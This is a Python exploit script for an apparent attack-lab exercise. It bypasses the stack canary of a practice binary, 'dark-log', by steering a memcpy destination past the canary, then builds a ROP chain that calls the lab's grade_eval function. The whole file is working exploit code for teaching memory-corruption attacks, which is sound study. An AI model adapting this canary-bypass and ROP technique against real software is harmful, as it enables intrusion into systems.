#!/usr/bin/env python3
"""Task 7: defeat attack/dark-log's stack canary without ever knowing its value.

struct log_frame lays out expression[128], logMsg[128], int len, pad[8], then the
stack canary.  input() does gets(f.expression) followed by
`memcpy(f.logMsg + f.len, f.expression, sizeof f.expression)` -- the destination
of the fixed 128-byte copy is controlled by the attacker-controlled `len`.
Setting len = 0xa0 makes the destination rbp, so the copy overwrites the saved
rbp and the return address while leaving the canary at rbp-8 untouched; the check
therefore passes and `leave; ret` enters the ROP chain below.

A plain `ret` between the argument and grade_eval keeps rsp % 16 == 8 at
grade_eval entry (SysV ABI), so its printf does not fault on `movaps`.
"""
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import attacklab

HERE = os.path.dirname(os.path.abspath(__file__))
ELF = attacklab.Elf(os.path.join(HERE, "attack", "dark-log"))

POP_RDI = attacklab.pop_rdi_ret(ELF)    # 0x4018a3
RET = attacklab.ret_gadget(ELF)         # 0x4018a4
GRADE_EVAL = ELF.symbol("grade_eval")   # 0x401677

# Frame-layout constant (not an address): logMsg sits at rbp - 0xa0, so a memcpy
# destination of logMsg + 0xa0 == rbp overwrites the saved rbp + return address.
OVERWRITE_DEST = 0xA0

chain = (
    b"K" * 8 +                            # fake saved rbp
    struct.pack("<Q", POP_RDI) +
    struct.pack("<Q", 4) +
    struct.pack("<Q", RET) +
    struct.pack("<Q", GRADE_EVAL)
)

payload = chain.ljust(256, b"L") + struct.pack("<I", OVERWRITE_DEST) + b"\n"
assert len(payload) == 261
assert b"\n" not in payload[:-1]
sys.stdout.buffer.write(payload)
